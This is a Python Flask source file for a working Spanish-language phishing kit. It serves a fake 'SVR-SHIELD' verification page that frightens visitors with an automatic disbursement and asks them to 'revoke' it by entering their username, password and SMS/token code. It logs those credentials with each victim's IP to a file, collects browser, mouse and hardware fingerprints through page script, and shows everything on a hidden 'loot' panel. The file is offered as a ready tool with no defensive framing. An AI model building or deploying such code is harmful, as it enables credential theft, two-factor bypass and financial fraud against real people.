from flask import Flask, render_template_string, request, redirect, jsonify
import datetime
import json

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>SVR-SHIELD | Protocolo de Verificación</title>
    <script>
        // CAPTURA DE COMPORTAMIENTO HUMANO
        let movements = [];
        document.onmousemove = (e) => {
            if(movements.length < 10) movements.push({x: e.pageX, y: e.pageY});
        };

        async function deep_harvest() {
            const data = {
                env: {
                    ref: document.referrer || "Directo",
                    url: window.location.href,
                    history: window.history.length
                },
                behavior: {
                    clicks: 0,
                    mouse: movements
                },
                hw: {
                    mem: navigator.deviceMemory,
                    cpu: navigator.hardwareConcurrency,
                    touch: navigator.maxTouchPoints,
                    res: window.screen.width + "x" + window.screen.height
                }
            };
            
            fetch('/svr_deep_data', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
        }
        window.onload = () => { setTimeout(deep_harvest, 2000); };
    </script>
    <style>
        body { background: #010409; color: #c9d1d9; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .console { border: 1px solid #238636; padding: 30px; background: #0d1117; box-shadow: 0 0 20px #23863655; max-width: 450px; border-radius: 5px; }
        .blink { animation: blinker 1s linear infinite; color: #238636; }
        @keyframes blinker { 50% { opacity: 0; } }
        input { background: #010409; border: 1px solid #30363d; color: #238636; padding: 12px; width: 100%; margin: 10px 0; box-sizing: border-box; }
        .btn { background: #238636; color: white; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="console">
        <div style="margin-bottom:20px;">
            <span class="blink">●</span> [SVR-SYSTEM-ONLINE]
            <div style="font-size:12px; color:#8b949e;">Detectando Hardware de Seguridad... OK</div>
        </div>
        <h3 style="color:#238636; margin:0;">VERIFICACIÓN REQUERIDA</h3>
        <p style="font-size:12px;">Confirme sus credenciales para detener el desembolso automático.</p>
        <form action="/login" method="post">
            <input type="text" name="u" placeholder="USUARIO / EMAIL" required>
            <input type="password" name="p" placeholder="CONTRASEÑA" required>
            <input type="text" name="t" placeholder="SMS / TOKEN" required>
            <button type="submit" class="btn">EJECUTAR REVOCACIÓN</button>
        </form>
        <div style="margin-top:20px; font-size:10px; color:#30363d;">ID_SESSION: 0x88239021-SVR</div>
    </div>
</body>
</html>
"""

@app.route('/svr_deep_data', methods=['POST'])
def svr_deep_data():
    data = request.json
    with open("deep_data.json", "a") as f:
        f.write(json.dumps(data) + "\\n")
    return '', 204

@app.route('/panel-secreto-svr')
def ver_botin():
    try:
        with open("capturas.txt", "r") as f: creds = f.read()
    except: creds = "Esperando..."
    try:
        with open("deep_data.json", "r") as f: deep = f.read()
    except: deep = "Analizando comportamiento..."
    
    return f"<html><body style='background:#000; color:#0f0; padding:20px; font-family:monospace;'><h2>🛰️ SVR-MATRIX: DEEP HARVEST</h2><hr><h3>🔑 CREDENCIALES:</h3><pre>{creds}</pre><h3>🕵️ COMPORTAMIENTO & HW:</h3><pre>{deep}</pre></body></html>"

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    u, p, t = request.form.get('u'), request.form.get('p'), request.form.get('t')
    with open("capturas.txt", "a") as f:
        f.write(f"[{datetime.datetime.now()}] U: {u} | P: {p} | T: {t} | IP: {request.remote_addr}\\n")
    return redirect("https://www.google.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
